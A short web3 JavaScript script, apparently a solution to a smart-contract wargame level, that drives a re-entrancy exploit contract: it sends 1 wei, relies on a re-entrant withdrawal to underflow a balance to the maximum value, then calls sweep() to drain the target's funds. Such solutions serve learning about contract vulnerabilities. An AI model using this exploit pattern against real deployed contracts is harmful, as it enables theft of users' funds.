
const contractAddr = "0x6cEe2D25344c7eeF4B3D4059Fc4A3AE2ee213157";

// using re-entrancy, the ReentrancyExploit contract withdraws
// (balances[contractAddr] + 1), which causes an underflow in
// balances[contractAddr] to uint256(-1) = uint256_max.
// after that, we can sweep the funds from the target contract.
await web3.eth.sendTransaction({ from: player, to: contractAddr, value: 1 });

const Exploit = new web3.eth.Contract([
    {
        "inputs": [],
        "name": "reentrance",
        "outputs": [
            {
                "internalType": "contract IReentrance",
                "name": "",
                "type": "address"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "returned",
        "outputs": [
            {
                "internalType": "bool",
                "name": "",
                "type": "bool"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "sweep",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "stateMutability": "payable",
        "type": "receive"
    }
], contractAddr);

await Exploit.methods.sweep().send({ from: player });
